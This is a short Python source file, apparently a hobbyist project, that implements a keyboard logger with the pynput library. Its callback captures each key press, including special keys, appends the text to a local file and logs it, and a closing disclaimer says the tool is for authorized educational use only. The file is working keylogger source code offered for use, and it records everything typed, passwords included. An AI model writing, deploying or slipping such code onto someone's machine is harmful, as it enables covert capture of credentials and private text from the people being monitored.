from pynput import keyboard 
import logging
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.delete: "[DELETE]",
    keyboard.Key.shift_l: "[SHIFT]",
    # keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl: "[CTRL]",
    keyboard.Key.alt: "[ALT]",
    keyboard.Key.esc: "[ESCAPE]",
    # Add more special keys as needed  
}

def The_wired(key):  #(keylogger) im just keeping to my theme ifyk yk 
    # print(str(key))   used for testing purposes in terminal so i know its recording the keys correctly
    if key == keyboard.Key.shift_r:  # Stop listener on 'Esc' key press added cuz ctr + c wasnt killing it
        return False
    
    with open("input.txt", "a") as myfile:
        try:
            char=key.char         
        except AttributeError:
            char = SPECIAL_KEYS.get(key, f"[{key.name}]")  
            print("error recording key")  
        myfile.write(char+"")  # write the character to the file
    if char: 
        logging.info(f"INPUT_CAPTURE: {char}") 
# Start the listener and keep it running
# if __name__ == "__main__":                                        this will be used for main.py left in here for testing purposes 
#     with keyboard.Listener(on_press=keyPress) as listener:
#         listener.join()  

#ayyeee we done with the The_Wired, simple but thats okay becuase .. 
        
""" 
IMPORTANT: This project is for Educational and Authorized Research Purposes Only. 
The author, zegetzero, does not condone or support the use of this software for malicious activities. 
Unauthorized access to computer systems is a violation of law and professional ethics. Use of this tool without explicit, 
written permission from the system owner is strictly prohibited.
"""
